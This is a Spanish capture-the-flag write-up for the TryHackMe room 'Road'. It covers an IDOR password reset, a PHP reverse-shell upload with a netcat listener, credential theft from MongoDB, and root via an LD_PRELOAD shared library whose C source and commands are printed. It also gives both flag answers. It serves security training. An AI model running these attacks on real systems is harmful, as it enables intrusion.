# Road

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF (Web to Root) | road | https://tryhackme.com/room/road | 02 Level Medium | TryHackMe | Aplicación web (PHP), IDOR en reseteo de contraseña, subida de archivos sin restricción, reverse shell, MongoDB, escalada con LD_PRELOAD (sudo env_keep), Linux | Compromiso total del host (RCE como www-data → SSH como webdeveloper → root vía LD_PRELOAD) y captura de las flags de usuario y root |

---

**Contexto:** La sala **Road** es una máquina Linux tipo *web-to-root* en la que se explota una aplicación web de seguimiento de envíos ("Sky Couriers") para obtener acceso inicial y después escalar hasta root. El recorrido empieza registrando una cuenta en el portal "Merchant Central": el panel revela el email del administrador y la función de reseteo de contraseña envía el email que se quiere resetear en la petición, lo que permite cambiar la contraseña del admin (IDOR). Con la cuenta de administrador se abusa de la subida de imagen de perfil para colocar una **reverse shell PHP** que se dispara desde `/v2/profileimages/`. Dentro de la máquina, una base de datos **MongoDB** guarda la contraseña del usuario `webdeveloper`, con la que se entra por SSH. Por último, `sudo -l` muestra que se puede ejecutar `/usr/bin/sky_backup_utility` como root con `env_keep+=LD_PRELOAD`, vector que permite cargar una librería compartida maliciosa y lanzar una shell root para leer la flag final.

## Solucionario

### Task 1: Flag de usuario / User flag
**Explicación:** Registrando una cuenta en `/v2/admin/register.html` se accede al panel, donde la página de perfil muestra el email del administrador. La función `/v2/ResetUser.php` incluye el email en la petición sin validar la sesión, de modo que se puede modificar para resetear la contraseña de `admin` y entrar en el panel administrativo. Como admin se habilitan la subida de imagen de perfil y el acceso al directorio `/v2/profileimages/`: con un payload de reverse shell PHP (`php-reverse-shell.php`) en la subida se obtiene una shell como `www-data`. Enumerando los servicios locales se encuentra **MongoDB** en `27017`; en la base de datos `backup` está la contraseña de `webdeveloper`, con la que se accede por SSH y se lee `user.txt`.

```bash
# Realizar el reset de contraseña tamperando el email del admin (Burp / curl)
POST /v2/ResetUser.php
username=admin@sky.thm  # email del administrador revelado en el perfil

# Subir la reverse shell como imagen de perfil y dispararla
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# editar IP/puerto y subir vía el perfil de admin
nc -lvnp <PORT>
curl http://<IP>/v2/profileimages/shell.php

# Enumerar servicios y extraer credenciales desde MongoDB
netstat -tlnp
mongosh mongodb://127.0.0.1:27017
show dbs
use backup
db.<coleccion>.find()   # -> password de webdeveloper

# SSH al usuario webdeveloper y leer la flag
ssh webdeveloper@<IP>
cat user.txt
```

| # | Pregunta / Question | Respuesta / Answer |
|---|--------------------|--------------------|
| 1 | What is the user.txt flag? | `63191e4ece37523c9fe6bb62a5364d45` |

### Task 2: Flag de root / Root flag
**Explicación:** Con la shell de `webdeveloper`, `sudo -l` muestra que puede ejecutar `/usr/bin/sky_backup_utility` como root sin contraseña, y que además `env_keep+=LD_PRELOAD` (o `env_keep+=LD_LIBRARY_PATH`) está activo. El binario lanza `tar` para crear un backup, pero se puede pre-cargar una librería compartida que ejecute código antes que el programa: se compila un `.so` con `gcc -fPIC -shared -nostartfiles` que en `_init()` fuerza `setuid(0)`/`setgid(0)` y abre `/bin/sh`. Ejecutándolo con `sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility` se obtiene una shell root y se lee `root.txt`.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
# whoami -> root
cat /root/root.txt
```

| # | Pregunta / Question | Respuesta / Answer |
|---|--------------------|--------------------|
| 1 | What is the root.txt flag? | `3a62d897c40a815ecbe267df2f533ac6` |

### Tabla unificada / Unified table

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the user.txt flag? | `63191e4ece37523c9fe6bb62a5364d45` |
| 2 | What is the root.txt flag? | `3a62d897c40a815ecbe267df2f533ac6` |

---

**Metodología:** Reconocimiento (nmap: 22/SSH y 80/HTTP) → registro de cuenta en la aplicación web → IDOR en el reseteo de contraseña para hacerse admin → subida de reverse shell (archivo PHP sin restricciones) → RCE inicial como `www-data` → enumeración de servicios locales y credenciales en MongoDB → acceso SSH como `webdeveloper` → abuso de `sudo` + `LD_PRELOAD` mediante librería compartida maliciosa → root y lectura de ambas flags.

**Learning chain:** Identificación de IDOR por tampering de peticiones → autenticación como admin → abuso de subida de archivos para RCE → pivotaje interno (MongoDB) → reutilización de credenciales (conexión SSH) → escalada de privilegios vía variables de entorno de sudo (`LD_PRELOAD`) → root.

**Lección:** *Una petición que confía en el email enviado por el cliente (IDOR) convierte un "reset de contraseña" en un vector de suplantación; y un solo `env_keep+=LD_PRELOAD` en sudo convierte cualquier binario ejecutable como root en una shell root.*

**MITRE ATT&CK:** T1595.002 Active Scanning (Vulnerability Scanning) · T1530 Data from Shared Storage / credenciales en MongoDB · T1574.006 Hijack Execution Flow (Dynamic Linker Hijacking / LD_PRELOAD) · T1068 Exploitation for Privilege Escalation · T1505.003 Web Shell (reverse shell PHP).

**Fuente:** [TryHackMe - Road](https://tryhackme.com/room/road)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.